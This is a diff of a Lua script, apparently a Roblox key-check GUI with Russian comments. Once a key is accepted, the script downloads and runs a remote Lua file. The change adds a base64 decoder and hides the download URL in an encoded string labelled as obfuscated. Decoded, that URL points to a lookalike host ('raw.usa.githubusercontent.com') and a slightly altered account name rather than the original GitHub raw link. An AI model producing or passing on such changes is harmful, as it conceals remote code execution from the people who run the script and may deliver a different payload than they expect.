@@ -29,7 +29,30 @@ if todayKeyTable then
     end
 end
 
--- GUI
+-- Функция для декодирования base64
+local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local b64decode = function(data)
+    data = string.gsub(data, '[^'..b64chars..'=]', '')
+    return (data:gsub('.', function(x)
+        if x == '=' then return '' end
+        local r,f='',(b64chars:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        if #x ~= 8 then return '' end
+        local c=0
+        for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Обфусцированная base64 ссылка на скрипт
+local encodedScriptURL = "aHR0cHM6Ly9yYXcudXNhLmdpdGh1YnVzZXJjb250ZW50LmNvbS90aWVueGtoYW5oMS9zcGljeS9tYWluL0NoaWxsaS5sdWE="
+
+-- Декодируем ссылку и запускаем
+local scriptURL = b64decode(encodedScriptURL)
+
+-- GUI (твой GUI код здесь)
 local gui = Instance.new("ScreenGui")
 gui.Name = "PlayerokKeyGui"
 gui.ResetOnSpawn = false
@@ -159,7 +182,7 @@ button.MouseButton1Click:Connect(function()
 		feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
 		wait(1)
 		gui:Destroy()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+		loadstring(game:HttpGet(scriptURL))()
 	else
 		feedback.Text = "❌ Неверный ключ"
 		feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
